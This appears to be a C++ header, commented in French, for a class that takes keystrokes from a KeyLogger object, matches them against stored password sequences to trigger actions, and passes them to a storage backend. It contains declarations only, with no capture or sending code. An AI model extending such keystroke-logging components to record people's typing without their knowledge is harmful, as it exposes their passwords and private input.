/*!
* \file Controleur.h
* Fichier entête de la classe abstraite Controleur
* \date 09/11/2008
* \author Xavier Monin
*/

#ifndef _CONTROLERKEYLOGGER_H_
#define _CONTROLERKEYLOGGER_H_

#include "AStockage.h"
#include "KeyLogger.h"

#include <vector>
#include <map>

//! Type personnalisé stockant un mot de passe 
typedef std::vector< std::string > MotDePasse;
//! Type personnalisé représentant l'identifiant d'une action
typedef size_t IdentifiantAction;
//! Type personnalisé stockant la liste des actions
typedef std::vector<size_t> ListeActions;

typedef std::map<size_t, MotDePasse> ListeMotsDePasse;
typedef std::map<size_t, size_t> ListeOccurences;

/*!
* \class Controleur
* \brief Controle l'envoi d'un objet KeyLogger.
* Controle les touches émises depuis un objet KeyLogger et emet ses touches.
* Cette classe permet d'effectuer des actions en controlant les touches émises.
* \author Xavier Monin
*/
class Controleur
{
public:
	Controleur();
	virtual ~Controleur(){}

	bool emettre(const std::string&);

	inline void definirSource(KeyLogger* source) { this->source_keylogger = source; }
	inline void definirStockage(AStockage* stockage) { this->stockage = stockage; }

protected:
	//! Méthode appelée à chaque touche pressée
	virtual void envoyer(const std::string&);
	//! Méthode appelée lorsqu'une action doit être effectuée
	virtual bool effectuerAction(IdentifiantAction) { return true; }

	IdentifiantAction ajouterAction(MotDePasse);
	void supprimerAction(IdentifiantAction);

	//! Objet source KeyLogger.
	KeyLogger* source_keylogger;

	//! Objet de stockage
	AStockage* stockage;

private:

	ListeActions verifierActions();

	//! Liste des mots de passe à vérifier
	ListeMotsDePasse liste_mdp;
	//! Liste des occurence trouvées par mot de passe
	ListeOccurences liste_occurence;
	//! Offset des actions (utile pour indexer les actions)
	IdentifiantAction position;

	//! La dernière touche pressée
	std::string derniere_touche;
};

#endif